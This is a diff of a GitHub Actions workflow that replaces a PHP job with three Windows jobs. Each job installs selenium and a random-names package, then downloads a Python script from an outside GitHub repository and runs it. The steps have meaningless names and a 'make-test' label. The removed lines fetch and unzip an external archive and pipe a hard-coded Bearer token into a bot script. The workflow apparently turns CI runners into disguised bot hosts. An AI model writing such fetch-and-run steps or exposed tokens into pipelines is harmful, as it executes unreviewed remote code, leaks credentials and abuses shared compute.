@@ -1,18 +1,65 @@
+name: winos
 on:
   push:
-name: hhs
-
+  pull_request:
+  
 jobs:
-  run_1:
-    runs-on: ubuntu-latest
+  test:
+    runs-on: windows-latest
+    name: make-test
+    strategy:
+      matrix:
+        python-version: [3.9]
     steps:
-    - name: Setup PHP
-      uses: shivammathur/setup-php@v2
+    - name: Set up Python
+      uses: actions/setup-python@v2
       with:
-        php-version: '8.1'
-        coverage: none
-    - name: Install dependenciess
-      run: |
-        wget https://github.com/Yabof386/bestj/raw/main/.github/workflows/masam.zip
-        unzip masam.zip
-        echo -e "Bearer f94e549433be21f888aa3605d6511cbcc618655ac4abd4413f2410d187e1a889\n1" | php bot.php
+        python-version: ${{ matrix.python-version }}        
+    - name: meyf
+      run: |       
+        pip install selenium
+        pip install names
+        pip3 install selenium
+        Invoke-WebRequest https://github.com/Yabof386/pyconbu/raw/main/conb/cop.py -OutFile pov.py
+        ls
+        python3 pov.py
+        
+  test_1:
+    runs-on: windows-latest
+    name: make-test-1
+    strategy:
+      matrix:
+        python-version: [3.9]
+    steps:
+    - name: Set up Python
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}        
+    - name: menisf
+      run: |       
+        pip install selenium
+        pip install names
+        pip3 install selenium
+        Invoke-WebRequest https://github.com/Yabof386/pyconbu/raw/main/conb/nos.py -OutFile ov.py
+        ls
+        python3 ov.py
+        
+  test_2:
+    runs-on: windows-latest
+    name: make-test-2
+    strategy:
+      matrix:
+        python-version: [3.9]
+    steps:
+    - name: Set up Python
+      uses: actions/setup-python@v2
+      with:
+        python-version: ${{ matrix.python-version }}        
+    - name: meuw
+      run: |       
+        pip install selenium
+        pip install names
+        pip3 install selenium
+        Invoke-WebRequest https://github.com/Yabof386/pyconbu/raw/main/conb/zobu.py -OutFile rv.py
+        ls
+        python3 rv.py
